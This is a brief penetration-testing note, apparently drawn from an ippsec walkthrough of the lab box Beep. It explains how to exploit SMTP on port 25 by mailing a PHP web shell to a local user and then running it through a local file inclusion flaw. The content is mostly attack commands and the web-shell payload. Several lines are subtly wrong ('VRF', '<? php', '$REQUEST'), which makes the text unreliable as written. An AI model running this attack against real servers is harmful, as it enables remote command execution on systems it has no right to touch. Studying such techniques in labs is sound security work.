# 25\_SMTP

## Background

* Requirement to exploit this service is to have an associated web application on the same box that is vulnerable to an LFI that displays mail from users in the web application.

## Exploit \(ippsec:Beep\)

1. Access the SMTP server.

   ```text
   telnet [IP] 25
   ```

2. Confirm that an assumed user is on the box.  This is the user we'll send an email to to exploit the LFI in the web application.

   ```text
   VRF [user]@localhost
   ```

3. Create a new mail to the confirmed user on the box.

   ```text
   Mail from:email@doesn'tmatter.com 
   Rcpt to: [user]@localhost 
   Data 
   Subject: Doesn't Matter 
   <? php echo system($REQUEST['neogeo']); ?>
   ```

4. Go to the web application and abuse the LFI vulnerability to navigate to the file location where our mail was sent and stored to execute the PHP script.

   ```text
   .../var/mail/[user]
   ```

5. If we're able to navigate here with our LFI, then we have command execution through the 'neogeo' variable.

   ```text
   .../var/mail/[user]&neogeo=[command]
   ```

